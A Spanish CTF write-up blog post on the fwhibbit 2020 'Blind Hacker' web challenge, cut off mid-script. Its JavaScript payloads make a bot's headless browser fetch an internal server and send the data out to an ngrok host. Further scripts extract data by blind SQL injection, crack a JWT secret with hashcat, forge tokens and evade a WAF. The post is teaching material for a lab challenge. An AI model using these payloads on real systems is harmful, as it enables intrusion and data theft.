@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>Blind Hacker - fwhibbit 2020 :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Blind Hacker - fwhibbit 2020 Hoy vamos a atacar el nuevo reto web del CTF fwhibbit 2020, si no habéis participado os recomiendo registraros y probar los retos, están muy currados.
+Introducción En este reto tenemos un Bot de Telegram, @blindhackerchallbot, el cual &amp;ldquo;analizará&amp;rdquo; la URL que le pidamos. La nota nos dice que existe un servidor web en http://blind_hacker por lo que supondremos que será accesible solo desde el bot de Telegram, teniendo que aprovecharnos del bot para intentar explotarlo." />
+<meta name="keywords" content="blind explotation, sqli, ctf" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/es/posts/fwhibbit-c0r0n4con-blindhacker/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="rmartinsanta" />
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Blind Hacker - fwhibbit 2020 :: Blog">
+<meta property="og:description" content="Writeup del nuevo reto web, Blind Hacker, del CTF fwhibbit/c0r0n4c0n 2020." />
+<meta property="og:url" content="https://raulmart.in/es/posts/fwhibbit-c0r0n4con-blindhacker/" />
+<meta property="og:site_name" content="Blind Hacker - fwhibbit 2020" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/ExplotacionACiegas.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-06-14 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/es/about/">Quiénes somos</a></li>
+        
+      
+        
+          <li><a href="/es/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>Español ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/es/about/">Quiénes somos</a></li>
+      
+    
+      
+        <li><a href="/es/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/es/posts/fwhibbit-c0r0n4con-blindhacker/">Blind Hacker - fwhibbit 2020</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-06-14 
+      </span>
+    
+    
+    <span class="post-author">:: Raúl Martín</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/es/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/ctf/">ctf</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/fwhibbit/">fwhibbit</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/web/">web</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/blind-explotation/">blind explotation</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/sqli/">sqli</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/ExplotacionACiegas.png" class="post-cover" alt="Blind Hacker - fwhibbit 2020" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="blind-hacker---fwhibbit-2020">Blind Hacker - fwhibbit 2020<a href="#blind-hacker---fwhibbit-2020" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Hoy vamos a atacar el nuevo reto web del CTF fwhibbit 2020, si no habéis participado os recomiendo <a href="https://ctf.c0r0n4con.com/">registraros</a> y probar los retos, están muy currados.</p>
+<h2 id="introducción">Introducción<a href="#introducción" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>En este reto tenemos un Bot de Telegram, <code>@blindhackerchallbot</code>, el cual &ldquo;analizará&rdquo; la URL que le pidamos. La nota nos dice que existe un servidor web en <code>http://blind_hacker</code> por lo que supondremos que será accesible solo desde el bot de Telegram, teniendo que aprovecharnos del bot para intentar explotarlo.</p>
+<p><img src="images/36aa8179326b441fbc0ff9b3eee08526.png" alt="0bd5ba7ed4a8ee8791f7cd0057f91b13.png"></p>
+<p>El bot parece que no responde a nuestros mensajes, por lo que tendremos que encontrar alguna forma de establecer comunicación bidireccional con el servidor web. Para hacer cómodamente el reto, crearemos nuestro propio servidor web, de forma que al pedirle al bot que analice nuestra página podamos observar cuál es su comportamiento e intentar influenciarlo.</p>
+<h2 id="herramientas">Herramientas<a href="#herramientas" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Utilizaremos Burp Suite para analizar las peticiones web y modificarlas en caso de ser necesario, ngrok para levantar un túnel accesible desde internet y NGINX como servidor web, de forma que las peticiones harían el siguiente recorrido:</p>
+<p><img src="images/ExplotacionACiegas.png" alt="Explotación a ciegas de vulnerabilidades web"></p>
+<p>Este esquema es útil para toda clase de retos &ldquo;a ciegas&rdquo;, para recuperar y analizar datos por un canal diferente al que inicia el ataque, como podría ser en casos de Blind XSS, Blind SQL (Ej: <a href="https://medium.com/bugbountywriteup/out-of-band-oob-sql-injection-87b7c666548b">Orace DB out of band data exfitration</a>), o OOB-XXE (<a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">Ejemplo</a>). La idea de utilizar <code>ngrok + burp</code> como alternativa a Burp Collaborator o similares no es un invento  mío, personalmente empezé a investigarlo tras <a href="https://twitter.com/jorge_ctf/status/1262682688571539456">un tweet de jorge_ctf</a>. Si quieres saber como montarlo en más detalle puedes leer los siguientes apartados, en caso contrario, puedes pasar a la siguiente sección.</p>
+<h3 id="nginx-o-cualquier-otro-servidor-web">Nginx (o cualquier otro servidor web)<a href="#nginx-o-cualquier-otro-servidor-web" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Utilizaré NGINX como servidor web, pero cualquiera debería funcionar sin mayor problema.
+Seguimos el proceso de instalación de <a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/">la página oficial</a>.</p>
+<p>Nota: Puesto que vamos a utilizar NGINX solo para ciertas tareas, desactivaré el arranque automático:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="179264853" type="checkbox"  />
+    <label for="179264853">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+sudo systemctl disable nginx
+</code></pre>
+  </div>
+
+
+<p>y lo arrancaré manualmente solo cuando necesite utilizarlo, con los comandos
+
+
+
+  <div class="collapsable-code">
+    <input id="873142956" type="checkbox"  />
+    <label for="873142956">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+sudo systemctl start nginx # Arrancar
+sudo systemctl stop nginx  # Parar
+</code></pre>
+  </div>
+
+</p>
+<p>Para hacer accesibles los archivos los colocaremos en la carpeta <code>/var/www/html</code>.</p>
+<p>Como alternativa muy fácil de usar a NGINX, pero menos potente, tanto Python 2 como Python 3 traen <a href="https://docs.python.org/3/library/http.server.html">un servidor web integrado</a>.
+Python 2:
+<code>python -m SimpleHTTPServer 80</code>
+Python 3:
+<code>python3 -m http.server 80</code></p>
+<h3 id="ngrok">Ngrok<a href="#ngrok" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Nos registramos y descargamos ngrok en <a href="https://dashboard.ngrok.com/signup">la página oficial</a>.</p>
+<p>Extraemos ngrok, recomiendo ponerlo en el path por ej. en <code>/usr/bin</code> para tenerlo accesible desde cualquier parte. Lo configuramos con nuestra API key usando el comando proporcionado, por ejemplo:
+<code>ngrok authtoken aaabbbcccddd111222333444</code></p>
+<p>y probamos a levantar un túnel al puerto 8080, o el que se haya configurado en Burp.</p>
+<p><code>ngrok http 8080</code></p>
+<p><img src="images/b7a1a13891cc4fe99eb498c10d1147e9.png" alt="423c49e7dbd2f4b79bb0e0029c8926e1.png"></p>
+<h3 id="burp-suite">Burp Suite<a href="#burp-suite" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Accedemos a la pestaña <code>Proxy</code>, desactivamos el modo Intercept (lo activaremos más adelante si es necesario), y nos vamos a opciones, donde editaremos el Listener que hay por defecto, para que redirija las peticiones a nuestro servidor web:</p>
+<p><img src="images/5b24c6c5f3c843a29bd1c6bc7c1abef7.png" alt="0abd8f4568220d3f2c58151bce8c1d14.png"></p>
+<p>Si todo va bien, deberíamos poder acceder a la URL que nos ha dado ngrok y ver los archivos del servidor web, quedando registradas en la pestaña <code>HTTP history</code> de Burp.</p>
+<h2 id="testing">Testing<a href="#testing" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Tras configurar y preparar las herramientas, creamos el esqueleto de una web simple en la carpeta configurada en NGINX, por ejemplo <code>/var/www/html</code>, y pedimos al bot que nos analice la página web:</p>
+<p><img src="images/74fe44d31fd54138aa756acac689753b.png" alt="25d0b6a39717d39acad26730e782348c.png"></p>
+<p>Podemos ver en Burp las peticiones en tiempo real, en concreto es interesante saber que tecnologías ha utilizado el bot para implementar su funcionalidad, en este caso parece haberse utilizado la última versión de Chrome en modo sin ventanas (headless).</p>
+<p><img src="images/b18855a866284dc6a20264f048bc6fd2.png" alt="40ba6eaeef61e2f4c189994fb9356fcc.png"></p>
+<p>Al tratarse de un navegador real, en vez de <code>curl</code>, <code>wget</code> o similares, el bot no sólo está descargando y mirando el archivo que le pedimos, sino también todos los recursos referenciados (hojas de estilo, fuentes, etc), por lo que el siguiente paso será intentar ejecutar código Javascript en el bot, y acceder al servidor de la descripción. Para ello probaremos el siguiente fragmento:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="795862413" type="checkbox"  />
+    <label for="795862413">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function get(url, callback)
+{
+    let xmlhttp=new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState == XMLHttpRequest.DONE)
+        {
+            callback(xmlhttp);
+        }
+    }
+    xmlhttp.open(&#34;GET&#34;, url);
+    xmlhttp.send();
+}
+
+get(&#39;http://blind_hacker&#39;, response =&gt; {
+        get(&#39;http://urlnuestrosrv.ngrok.io/&#39;&#43;btoa(response.responseText), () =&gt; {});
+});
+</code></pre>
+  </div>
+
+
+<p>Con el que obtenemos:
+<img src="images/28d118e400614156be8670f78c12ed2c.png" alt="c505ca5ef9e344057ed0a00a5bbd1820.png"></p>
+<p>Haciendo base64 decode (Enviaré siempre el contenido de la web como base64 para evitar problemas con caracteres especiales.)</p>
+<p><img src="images/b0d5bbd9a3514240a0be232d22d8d5b8.png" alt="9f3dae82697b99b885b9adb4360c7662.png"></p>
+<p>Como podemos ver, hemos sido capaces de exfiltrar el contenido de la web <code>http://blind_hacker</code> a través del bot, por lo que pasamos a intentar explotarla.</p>
+<h2 id="parte-1">Parte 1<a href="#parte-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Necesitamos obtener un valor para el parámetro <code>indextoken</code>, si nos inventamos un valor cualquiera la web nos rechazará con el siguiente mensaje: <code>Invalid token! Have you met token.php?</code></p>
+<p>Enviando una petición a <code>token.php</code> obtenemos un token válido, por lo que solo queda automatizarlo:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="516742938" type="checkbox"  />
+    <label for="516742938">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function get(theUrl, callback)
+{
+    let xmlhttp=new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState == XMLHttpRequest.DONE)
+        {
+            callback(xmlhttp);
+        }
+    }
+    xmlhttp.open(&#34;GET&#34;, theUrl);
+    xmlhttp.send();
+}
+
+get(&#39;http://blind_hacker/token.php&#39;, x =&gt; {
+        let items = x.responseText.split(&#34; &#34;);
+        let token = items[items.length - 1];
+        get(&#39;http://blind_hacker/?indextoken=&#39;&#43;token, indexResponse =&gt; {
+                get(&#39;http://ca2116f71dd7.ngrok.io/&#39;&#43;btoa(indexResponse.responseText), () =&gt; {});
+        });
+});
+</code></pre>
+  </div>
+
+
+<p>con lo que obtenemos la siguiente respuesta:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="976584123" type="checkbox"  />
+    <label for="976584123">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;html&gt;
+&lt;h1&gt; BLIND HACKER FORUM &lt;/h1&gt;
+&lt;center&gt;
+        &lt;form method=&#34;post&#34; action=&#34;&#34; name=&#34;signin-form&#34;&gt;
+            &lt;div class=&#34;form-element&#34;&gt;
+                &lt;label&gt;Username: &lt;/label&gt;
+                &lt;input type=&#34;text&#34; name=&#34;username&#34; id=&#34;username&#34; required /&gt;
+            &lt;/div&gt;
+            &lt;br&gt;
+            &lt;div class=&#34;form-element&#34;&gt;
+                &lt;label&gt;Password: &lt;/label&gt;
+                &lt;input type=&#34;password&#34; name=&#34;password&#34; id=&#34;password&#34; required /&gt;
+            &lt;/div&gt;
+            &lt;br&gt;
+            &lt;button type=&#34;submit&#34; name=&#34;login&#34; value=&#34;login&#34;&gt;Log In&lt;/button&gt;
+        &lt;/form&gt;
+&lt;/center&gt;
+&lt;/html&gt;
+</code></pre>
+  </div>
+
+
+<p>Jugando con el formulario vemos que es vulnerable a <code>Boolean Based SQL Injection</code> en el campo <code>password</code>, puesto que si enviamos alguna query que evalue a True, como <code>asdasd' or username like '%</code> obtenemos:</p>
+<p><img src="https://media1.tenor.com/images/846849a8d00a837962f8e9745101489c/tenor.gif?itemid=14042558" alt="Yisus"></p>
+<p>Mientras que, si evalúa a falso, como <code>asdasd' or username like 'a</code>:</p>
+<p><img src="https://media1.tenor.com/images/3d06a73ca95c1c1bd91fb4798754c7e3/tenor.gif?itemid=16889809" alt="Ataud"></p>
+<p>Sabiendo esto, implementaremos en Javascript un &ldquo;micro-SQLMap&rdquo;, por llamarlo de alguna manera, para exfiltrar los datos:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="384291675" type="checkbox"  />
+    <label for="384291675">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function get(theUrl, callback)
+{
+    let xmlhttp=new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState == XMLHttpRequest.DONE)
+        {
+            callback(xmlhttp);
+        }
+    }
+    xmlhttp.open(&#34;GET&#34;, theUrl);
+    xmlhttp.send();
+}
+
+function login(token, user, pw, callback)
+{
+    let xmlhttp=new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState == XMLHttpRequest.DONE)
+        {
+            callback(xmlhttp);
+        }
+    }
+    let formdata = new FormData();
+    formdata.set(&#34;username&#34;, user);
+    formdata.set(&#34;password&#34;, pw);
+    xmlhttp.open(&#34;POST&#34;, &#34;http://blind_hacker/?indextoken=&#34;&#43;token);
+    xmlhttp.send(formdata);
+}
+
+function isTrue(response){
+    return response.responseText.includes(&#34;jesus-jesus-walk-yass-jesus-gif-14042558&#34;);
+}
+
+
+function recursive(base){
+get(&#34;http://blind_hacker/token.php&#34;, x =&gt; {
+        let items = x.responseText.split(&#34; &#34;);
+        let token = items[items.length - 1];
+        let alphabet = &#34;abcdefghijklmnopqrstuvwxyz0123456789@.,?!{} =-&#43;&#34;;
+    	for(let i = 0; i &lt; alphabet.length; i&#43;&#43;){
+    		// Las columnas validas son username, password, email
+        	login(token, &#34;kdasasdasd&#34;, &#34;askjsjd&#39; or email like &#39;&#34;&#43;base&#43;alphabet[i]&#43;&#34;%&#34;, loginResponse =&gt; {
+            	// avisar de que char es correcto y seguir
+            	if(isTrue(loginResponse)){
+                get(&#34;http://ca2116f71dd7.ngrok.io/&#34; &#43;base&#43;alphabet[i], () =&gt; {});
+                        recursive(base &#43; alphabet[i]);
+            }
+        });
+    }
+    
+    // La _ es un caso especialito
+    login(token, &#34;kdasasdasd&#34;, &#34;askjsjd&#39; or email like &#39;&#34;&#43;base&#43;&#34;\\_%&#34;, loginResponse =&gt; {
+                        // si es correcto seguimos
+                        if(isTrue(loginResponse)){
+                                get(&#34;http://ca2116f71dd7.ngrok.io/&#34; &#43; base &#43; &#34;\\_%&#34;, () =&gt; {});
+                                recursive(base &#43; &#34;\\_&#34;);
+                        }
+        });
+});
+}
+recursive(&#34;&#34;); // Como el tiempo de ejecución está limitado, se puede continuar por donde se haya quedado, ej: &#34;flag&#34;.
+</code></pre>
+  </div>
+
+
+<p>Con lo que empezaremos a exfiltrar las diferentes columnas de la base de datos (ejemplo para el caso email):</p>
+<p><img src="images/326fab6a550a4b70abb3da11d8a5fb71.png" alt="34a05e6af173ae96bf315338e0327db2.png"></p>
+<p>Como comentario sobre el código, es necesario manejar el caso <code>_</code> separado del resto para que la base de datos no lo interprete como <a href="https://stackoverflow.com/questions/7323162/sqlite-like-and">un carácter comodín</a>. Tras exfiltrar las 3 columnas (username, password, email), iniciando sesión con el usuario <code>betauser</code> y contraseña <code>letsputapass!</code> obtenemos el siguiente mensaje:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="294853671" type="checkbox"  />
+    <label for="294853671">
+      <span class="collapsable-code__language">Text</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-Text" ><code>
+index.php is deprecated, please go to the new forum located at blind_hacker_forum (hostname). At least you got a part of the flag ;)
+</code></pre>
+  </div>
+
+
+<p>Así que a seguir sufriendo (╯°□°）╯︵ ┻━┻</p>
+<h2 id="parte-2">Parte 2<a href="#parte-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Al hacer un GET a la nueva URL utilizando la misma técnica de punto anterior nos pide un token adicional, por lo que automatizamos todo el proceso y probamos:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="657321984" type="checkbox"  />
+    <label for="657321984">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function get(theUrl, callback, auth)
+{
+    let xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState==4)
+        {
+            callback(xmlhttp);
+        }
+    }
+    xmlhttp.open(&#34;GET&#34;, theUrl);
+    if(auth){
+        xmlhttp.setRequestHeader(&#39;forum_auth&#39;, auth);
+    }
+    xmlhttp.send();
+}
+
+function isTrue(response){
+        return response.responseText.includes(&#34;a match&#34;);
+}
+
+
+function test(column){
+get(&#34;http://blind_hacker/token.php&#34;, first =&gt; {
+    let items = first.responseText.split(&#34; &#34;);
+    let token1 = items[items.length - 1];
+    get(&#34;http://blind_hacker_forum/token&#34;, second =&gt; {
+            let items = second.responseText.split(&#34; &#34;);
+            let token2 = items[items.length - 1];
+            
+            get(&#34;http://blind_hacker_forum/?indextoken=&#34; &#43;token1 &#43; &#34;&amp;forumtoken=&#34;&#43;token2, forum =&gt; {
+                    get(&#34;http://ca2116f71dd7.ngrok.io/&#34; &#43; btoa(forum.responseText &#43; &#34;\n\n&#34; &#43; forum.getAllResponseHeaders()), () =&gt; {});
+            });
+    });
+});
+}
+
+test();
+</code></pre>
+  </div>
+
+
+<p>Repuesta:</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="758439126" type="checkbox"  />
+    <label for="758439126">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+content-length: 218 
+content-type: text/html; charset=utf-8 
+date: Sun, 14 Jun 2020 01:51:20 GMT 
+forum_auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoibm8ifQ.dpWu5YCBeeOBknVGhkPPCz0d30PFABcGIB0aEQEWg5o 
+server: Werkzeug/1.0.1 Python/3.6.10
+
+&lt;html&gt;
+&lt;h1&gt; BLIND HACKER ACTUAL FORUM &lt;/h1&gt;
+&lt;h1&gt; Improved security, changed the engine to keep data and began to listen to rock &amp; roll! &lt;/h1&gt;
+&lt;/html&gt;
+
+You were not authed, but I have just sent you a guest permission.
+</code></pre>
+  </div>
+
+
+<p>En la cabecera tenemos un campo no estándar <code>forum_auth</code>, con un token <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JWT</a>.</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="751864392" type="checkbox"  />
+    <label for="751864392">
+      <span class="collapsable-code__language">json</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-json" ><code>
+{
+  &#34;id&#34;: &#34;1337&#34;,
+  &#34;username&#34;: &#34;guest&#34;,
+  &#34;password&#34;: &#34;h4x0r&#34;,
+  &#34;email&#34;: &#34;guest@where.ever&#34;,
+  &#34;is_admin&#34;: &#34;no&#34;
+}
+</code></pre>
+  </div>
+
+
+Utilizando el debugger de <a href="https://jwt.io/">jwt.io</a> podemos modificar y firmar nuevos tokens cómodamente, tan solo necesitamos averiguar el secreto utilizado para generarlos. Para ello utilizaremos <code>hashcat</code> con el diccionario <code>rockyou.txt</code>.</p>
+<p>
+
+
+  <div class="collapsable-code">
+    <input id="125489637" type="checkbox"  />
+    <label for="125489637">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+poltatil@kali:~/Coronacon/Web/BlindWeb$ echo &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoibm8ifQ.dpWu5YCBeeOBknVGhkPPCz0d30PFABcGIB0aEQEWg5o&#39; &gt;forum_auth
+poltatil@kali:~/Coronacon/Web/BlindWeb$ hashcat -m 16500 -a 0 forum_auth /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0-1774-gf96594ef) starting...
+[...]
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMzciLCJ1c2VybmFtZSI6Imd1ZXN0IiwicGFzc3dvcmQiOiJoNHgwciIsImVtYWlsIjoiZ3Vlc3RAd2hlcmUuZXZlciIsImlzX2FkbWluIjoibm8ifQ.dpWu5YCBeeOBknVGhkPPCz0d30PFABcGIB0aEQEWg5o:cookie
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: JWT (JSON Web Token)
+Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEzMz...QEWg5o
+Time.Started.....: Sun Jun 14 04:29:45 2020, (0 secs)
+Time.Estimated...: Sun Jun 14 04:29:45 2020, (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   987.1 kH/s (5.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 123456 -&gt; whitetiger
+
+Started: Sun Jun 14 04:29:42 2020
+Stopped: Sun Jun 14 04:29:46 2020
+</code></pre>
+  </div>
+
+
+Hemos recuperado el secreto usado para firmar los tokens, <code>cookie</code>. Ahora podemos hacer que el servidor acepte nuestros tokens, probaremos a mandarle unas jugosas comillas, con lo que veremos que es de nuevo vulnerable a Boolean Blind SQL Inyection en el campo <code>is_admin</code>, pero esta vez tendremos que saltarnos un Guau Guau <a href="https://es.wikipedia.org/wiki/Web_application_firewall">(WAF)</a>, que nos filtra algunos intentos de inyección.</p>
+<p>Probando que cosas están bloqueadas y cuáles permitidas, detectamos que <code>LIKE</code> está bloqueado, pero <code>lIkE</code> permitido. <code>%</code> está bloqueado también, pero <code>_</code> (cualquier carácter) no. Para explotarlo, reutilizaremos gran parte del código de la fase anterior, teniendo cuidado de no despertar al perrete. Para ello primero calcularemos la longitud de los datos de la columna, concatenando <code>_</code> hasta obtener una respuesta verdadera, para luego extraer el contenido reemplazando los <code>_</code> por el carácter correspondiente.</p>
+<p>HTML
+
+
+
+  <div class="collapsable-code">
+    <input id="978162354" type="checkbox"  />
+    <label for="978162354">
+      <span class="collapsable-code__language">html</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-html" ><code>
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+  &lt;meta charset=&#34;utf-8&#34;&gt;
+  &lt;title&gt;&lt;/title&gt;
+  &lt;meta name=&#34;author&#34; content=&#34;dEjAmE EntRaR YA&#34;&gt;
+  &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
+  &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;p&gt;Hello, world!&lt;/p&gt;  
+&lt;script src=&#34;https://kjur.github.io/jsrsasign/jsrsasign-latest-all-min.js&#34;&gt;
+&lt;/script&gt;
+&lt;script src=&#34;fase2.js&#34;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+  </div>
+
+</p>
+<p>Javascript
+
+
+
+  <div class="collapsable-code">
+    <input id="517842396" type="checkbox"  />
+    <label for="517842396">
+      <span class="collapsable-code__language">javascript</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-javascript" ><code>
+function get(theUrl, callback, auth)
+{
+    let xmlhttp = new XMLHttpRequest();
+    xmlhttp.onreadystatechange=function(){
+        if (xmlhttp.readyState==4)
+        {
+            callback(xmlhttp);
+        }
+    }
+    xmlhttp.open(&#34;GET&#34;, theUrl);
+    if(auth){
+        xmlhttp.setRequestHeader(&#39;forum_auth&#39;, auth);
+    }
+    xmlhttp.send();
+}
+
+function isTrue(response){
+        return response.responseText.includes(&#34;a match&#34;);
+}
+
+let serialized_headers = JSON.stringify({alg: &#39;HS256&#39;, typ: &#39;JWT&#39;});
+
+function extractLengths(column){
+get(&#34;http://blind_hacker/token.php&#34;, first =&gt; {
+    let items = first.responseText.split(&#34; &#34;);
+    let token1 = items[items.length - 1];
+    get(&#34;http://blind_hacker_forum/token&#34;, second =&gt; {
+            let items = second.responseText.split(&#34; &#34;);
+            let token2 = items[items.length - 1];
+            
+            let size = &#34;&#34;;
+            for(let i = 1; i&lt;50; i&#43;&#43;){
+                size &#43;= &#34;_&#34;;
+                let serialized_payload = JSON.stringify({
+                    id: &#34;1337&#34;,
+                    username: &#34;imaginary&#34;,
+                    password: &#34;imaginary&#34;,
+                    email: &#34;doesnot@exist&#34;,
+                    is_admin: &#34;yes&#39; union all select username,version(),&#39;1&#39;,&#39;1&#39; from userinfo where &#34; &#43; column &#43; &#34; lIkE &#39;INYECTAME-BABY&#39; -- &#34;.replace(&#34;INYECTAME-BABY&#34;, size)
+                });
+                
+                let auth_string = KJUR.jws.JWS.sign(&#34;HS256&#34;, serialized_headers, serialized_payload, &#34;cookie&#34;);
